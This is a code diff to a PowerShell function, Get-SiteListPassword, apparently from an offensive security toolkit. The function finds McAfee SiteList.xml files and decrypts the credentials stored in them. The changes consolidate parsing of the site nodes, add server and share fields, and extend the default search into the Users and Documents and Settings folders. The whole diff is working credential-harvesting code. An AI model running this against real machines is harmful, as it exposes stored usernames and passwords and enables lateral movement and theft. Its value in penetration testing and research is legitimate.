@@ -17,6 +17,8 @@ function Get-SiteListPassword {
         Optional path to a SiteList.xml file.
 
     .EXAMPLE
+    
+        PS C:\> Get-SiteListPassword
 
         EncPassword : jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==
         UserName    :
@@ -91,7 +93,6 @@ function Get-SiteListPassword {
         # set the options we need
         $3DES.Mode = 'ECB'
         $3DES.Padding = 'None'
-        $3DES.IV = ,0x00*8
         $3DES.Key = $3DESKey
 
         # decrypt the unXor'ed block
@@ -123,66 +124,36 @@ function Get-SiteListPassword {
             if($SiteListXml.InnerXml -Like "*password*") {
                 Write-Verbose "Potential password in found in $Path"
 
-                $SiteListXml.SiteLists.SiteList.HttpSite | Foreach-Object {
-                    $Name = $_.Name
-                    $Enabled = $_.Enabled
-                    $Server = $_.Server
-                    $Path = $_.RelativePath
-                    $UserName = $_.UserName
-                    $PasswordRaw = $_.Password.'#Text'
-                    
+                $SiteListXml.SiteLists.SiteList.ChildNodes | Foreach-Object {                    
                     try {
                         $PasswordRaw = $_.Password.'#Text'
 
                         # decrypt the base64 password
-                        $DecPassword = Get-DecryptedSitelistPassword -B64Pass $PasswordRaw
+                        $DecPassword = if($PasswordRaw) { (Get-DecryptedSitelistPassword -B64Pass $PasswordRaw).Decrypted } else {''}
 
-                        #Create custom object to output results
+                        $Server = if($_.ServerIP) { $_.ServerIP } else { $_.Server }
+                        $Path = if($_.ShareName) { $_.ShareName } else { $_.RelativePath }
+
                         $ObjectProperties = @{
                             'Name' = $_.Name;
                             'Enabled' = $_.Enabled;
-                            'Server' = $_.Server;
-                            'Path' = $_.RelativePath;
-                            'DomainName' = '';
-                            'UserName' = $_.UserName;
-                            'EncPassword' = $PasswordRaw;
-                            'DecPassword' = $DecPassword.Decrypted;
-                        }
-                        New-Object -TypeName PSObject -Property $ObjectProperties
-                    }
-                    catch {
-                        Write-Debug "Error parsing HttpSite : $_"
-                    }
-                }
-
-                $SiteListXml.SiteLists.SiteList.UNCSite | Foreach-Object {                    
-                    try {
-                        $PasswordRaw = $_.Password.'#Text'
-
-                        # decrypt the base64 password
-                        $DecPassword = Get-DecryptedSitelistPassword -B64Pass $PasswordRaw
-
-                        #Create custom object to output results
-                        $ObjectProperties = @{
-                            'Name' = $_.Name;
-                            'Enabled' = $_.Enabled;
-                            'Server' = $_.Server;
-                            'Path' = $_.ShareName;
+                            'Server' = $Server;
+                            'Path' = $Path;
                             'DomainName' = $_.DomainName;
                             'UserName' = $_.UserName;
                             'EncPassword' = $PasswordRaw;
-                            'DecPassword' = $DecPassword.Decrypted;
+                            'DecPassword' = $DecPassword;
                         }
                         New-Object -TypeName PSObject -Property $ObjectProperties
                     }
                     catch {
-                        Write-Debug "Error parsing UNCSite : $_"
+                        Write-Debug "Error parsing node : $_"
                     }
                 }
             }
         }
         catch {
-            Write-Error $Error[0]
+            Write-Error $_
         }
     }
 
@@ -190,8 +161,9 @@ function Get-SiteListPassword {
         $XmlFiles = Get-ChildItem -Path $SiteListFilePath
     }
     else {
-        $XmlFiles = Get-ChildItem -Recurse -Include 'SiteList.xml' -Path 'C:\Program Files\' -ErrorAction SilentlyContinue
-        $XmlFiles += Get-ChildItem -Recurse -Include 'SiteList.xml' -Path 'C:\Program Files (x86)\' -ErrorAction SilentlyContinue
+        $XmlFiles = 'C:\Program Files\','C:\Program Files (x86)\','C:\Documents and Settings\','C:\Users\' | Foreach-Object {
+            Get-ChildItem -Path $_ -Recurse -Include 'SiteList.xml' -ErrorAction SilentlyContinue
+        }
     }
 
     $XmlFiles | Where-Object { $_ } | Foreach-Object {
